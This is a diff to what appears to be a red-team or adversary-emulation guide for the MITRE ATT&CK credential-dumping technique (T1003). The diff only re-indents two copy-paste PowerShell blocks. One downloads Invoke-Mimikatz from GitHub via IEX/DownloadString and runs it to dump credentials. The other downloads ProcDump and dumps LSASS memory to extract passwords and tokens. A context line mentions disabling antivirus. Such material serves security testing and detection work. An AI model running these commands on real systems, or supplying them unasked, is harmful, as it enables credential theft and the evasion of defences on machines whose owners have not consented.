@@ -74,13 +74,13 @@ w> Mimikatz almost always will flag on antivirus so it's important to disable an
 Execute a **Credential Dump with Mimikatz**. 
 - MITRE ATT&CK Technique: [ATT&CK T1003 - Credential Access - Credential Dumping](https://attack.mitre.org/techniques/T1003)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	# Mimikatz
-	Write-Host -ForegroundColor Cyan "Executing Credential Dump - T1003 - Credential Dumping with Mimikatz"
-	$MimikatzURL = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'
-	$cmd = "IEX (New-Object Net.WebClient).DownloadString('$MimikatzURL'); Invoke-Mimikatz -DumpCreds; Start-Sleep -m $n"
-	powershell.exe -command $cmd
-	```
+```PowerShell
+# Mimikatz
+Write-Host -ForegroundColor Cyan "Executing Credential Dump - T1003 - Credential Dumping with Mimikatz"
+$MimikatzURL = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'
+$cmd = "IEX (New-Object Net.WebClient).DownloadString('$MimikatzURL'); Invoke-Mimikatz -DumpCreds; Start-Sleep -m $n"
+powershell.exe -command $cmd
+```
 
 
 
@@ -90,11 +90,11 @@ Execute a **Credential Dump with Mimikatz**.
 Execute a **Credential Dump with Procdump**. 
 - MITRE ATT&CK Technique: [ATT&CK T1003 - Credential Access - Credential Dumping](https://attack.mitre.org/techniques/T1003)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	# Extract LSASS memory with Procdump
-	Write-Host -ForegroundColor Cyan "Executing Credential Dump - T1003 - Credential Dumping with Mimikatz"
-	Write-Host -ForegroundColor Cyan  "Downloading ProcDump.exe"
-	Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$Env:temp\procdump.exe"
-	Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
-	& "$Env:temp\procdump.exe" -ma lsass.exe lsass.dmp -accepteula
-	```
+```PowerShell
+# Extract LSASS memory with Procdump
+Write-Host -ForegroundColor Cyan "Executing Credential Dump - T1003 - Credential Dumping with Mimikatz"
+Write-Host -ForegroundColor Cyan  "Downloading ProcDump.exe"
+Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$Env:temp\procdump.exe"
+Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
+& "$Env:temp\procdump.exe" -ma lsass.exe lsass.dmp -accepteula
+```
